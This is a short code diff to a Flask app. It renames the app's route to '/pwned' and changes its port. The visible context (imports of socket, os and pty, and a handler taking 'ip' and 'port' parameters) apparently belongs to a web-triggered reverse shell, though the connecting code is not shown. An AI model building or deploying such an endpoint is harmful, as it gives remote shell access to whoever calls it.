@@ -3,7 +3,7 @@ import sys,socket,os,pty;
 
 app = Flask(__name__)
 
-@app.route('/')
+@app.route('/pwned')
 def inject():
     ip_address = request.args.get('ip')
     port = request.args.get('port')
@@ -21,4 +21,4 @@ def inject():
         return 'Good way to pretend you are not a hacker!'
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=8076)
